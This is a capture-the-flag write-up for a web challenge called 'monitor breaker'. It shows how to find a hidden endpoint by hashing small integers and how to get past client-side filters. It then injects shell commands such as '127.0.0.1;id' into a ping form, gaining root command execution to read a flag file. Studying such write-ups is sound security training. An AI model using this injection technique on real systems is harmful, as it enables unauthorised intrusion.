# Monitor Breaker - Writeup

## Challenge Info

- **Name**: `monitor breaker`
- **Category**: `Web`
- **Description**: `A maintenance interface leaked into production. Your job: interact with the system monitors and extract the flag from this broken console.`
- **Challenge URL**: <https://monitor-breaker-f691b9f6-c897-491f-a280-924cdfda920e.ctf.ritsec.club/>
- **Flag format**: `RS{...}`

## Flag

```text
RS{1_br0k3_17_e6ebced80740d006889f26ceeeee666b}
```

## Overview

This challenge is a hidden-endpoint discovery plus command-injection bug.

The dashboard only shows two monitor pages, but the monitor URLs are not random at all. They are MD5 hashes of small integers:

- `/_sys/c4ca4238a0b923820dcc509a6f75849b` = `md5("1")`
- `/_sys/c81e728d9d4c2f636f067f89cc14862c` = `md5("2")`

That pattern immediately suggests trying neighboring integers. Enumerating `md5("0")` reveals a third monitor that is not linked from the main page:

```text
/_sys/cfcd208495d565ef66e7dff9f98764da
```

That hidden page contains a "Network Ping Tool" with a POST-based backend. The frontend claims that only IPv4 addresses are allowed, but the restriction is implemented only in browser-side JavaScript and HTML attributes. The backend accepts raw input and passes it to a shell command, which gives us command injection.

## Initial Recon

The landing page contains a simple admin dashboard with three cards:

- `Network Health`
- `Performance Monitor`
- `System Logs`

Only two of them are linked. The visible `_sys` links are:

```text
/_sys/c4ca4238a0b923820dcc509a6f75849b
/_sys/c81e728d9d4c2f636f067f89cc14862c
```

Those hashes decode cleanly:

```python
>>> import hashlib
>>> hashlib.md5(b"1").hexdigest()
'c4ca4238a0b923820dcc509a6f75849b'
>>> hashlib.md5(b"2").hexdigest()
'c81e728d9d4c2f636f067f89cc14862c'
```

So the natural next step is to try nearby values.

## Hidden Monitor Discovery

Enumerating `md5(str(i))` for a small range shows three valid monitors:

```text
00 cfcd208495d565ef66e7dff9f98764da 200 Network Health Check
01 c4ca4238a0b923820dcc509a6f75849b 200 System Performance
02 c81e728d9d4c2f636f067f89cc14862c 200 System Logs
```

The important one is `md5("0")`, which is hidden from the dashboard.

Visiting that endpoint reveals a "Network Ping Tool" form that submits to the same route:

```html
<input
  type="text"
  id="target"
  name="target"
  pattern="[0-9.;&|!$()\\s]*"
  title="Only numbers and command characters allowed"
/>
```

And the client-side filtering is even weaker:

```javascript
targetInput.addEventListener('input', e => {
  targetInput.value = targetInput.value.replace(/[a-zA-Z]/g, '');
});
```

That means the browser UI strips letters, but a direct POST request can send anything.

## Command Injection

The backend is vulnerable to shell injection through the `target` parameter. Sending:

```text
target=127.0.0.1;id
```

returns:

```text
uid=0(root) gid=0(root) groups=0(root)

/bin/sh: 1: ping: not found
```

Two useful details drop out of that response:

1. Our injected command is executed successfully.
2. The service runs as `root`.

The `ping: not found` error is harmless. It just means the intended command is missing in the container, but our injected command still runs.

## Finding The Flag

Once command injection is confirmed, the rest is straightforward filesystem enumeration.

First, locate likely flag files:

```sh
find /app -maxdepth 1 -iname 'flag*' 2>/dev/null
```

This returns:

```text
/app/flag-9d444ad0f475b52e79a1713f25646dce.txt
```

Then read it:

```sh
cat /app/flag-9d444ad0f475b52e79a1713f25646dce.txt
```

## Exploit Flow

The complete exploit path is:

1. Fetch `/` and notice the `_sys/<md5>` naming scheme.
2. Enumerate small integers and discover the hidden `md5("0")` endpoint.
3. POST directly to that endpoint, bypassing the client-side input restrictions.
4. Inject shell syntax with `;`.
5. Use the resulting command execution to search for and read the flag file.

## Solver Script

I added [solution.py](/home/jilani/Desktop/ritsecCTF-2026/web/monitor-breaker/solution.py), which:

- fetches the dashboard
- parses the linked monitor endpoints
- enumerates `md5(0..9)` to find the hidden monitor
- confirms command injection with `id`
- locates the flag file
- reads and prints the final flag

Run it with the current instance URL:

```bash
python3 solution.py
```

Or against another spun-up team instance:

```bash
python3 solution.py 'https://monitor-breaker-<instance>.ctf.ritsec.club/'
```

Expected output:

```text
[+] Target: https://monitor-breaker-f691b9f6-c897-491f-a280-924cdfda920e.ctf.ritsec.club/
[+] Dashboard exposes 2 monitor link(s)
    - /_sys/c4ca4238a0b923820dcc509a6f75849b
    - /_sys/c81e728d9d4c2f636f067f89cc14862c
[+] Enumerating candidate monitor hashes md5(0..9)
    - 0: 200 hidden /_sys/cfcd208495d565ef66e7dff9f98764da [Network Health Check]
    - 1: 200 linked /_sys/c4ca4238a0b923820dcc509a6f75849b [System Performance]
    - 2: 200 linked /_sys/c81e728d9d4c2f636f067f89cc14862c [System Logs]
[+] Hidden monitor found: https://monitor-breaker-f691b9f6-c897-491f-a280-924cdfda920e.ctf.ritsec.club/_sys/cfcd208495d565ef66e7dff9f98764da
[+] Command injection confirmed: uid=0(root) gid=0(root) groups=0(root)
[+] Flag file candidate: /app/flag-9d444ad0f475b52e79a1713f25646dce.txt
[+] Flag: RS{1_br0k3_17_e6ebced80740d006889f26ceeeee666b}
```

## Why This Works

The challenge tries to hide the vulnerable functionality behind:

- an unlinked monitor endpoint
- hashed route names
- client-side input restrictions

But none of those defenses matter:

- the hashes are predictable
- the hidden endpoint is still publicly reachable
- client-side validation can be bypassed with a direct POST
- the backend executes user input in a shell context

Once the hidden route is found, the bug is a straight command injection to root.
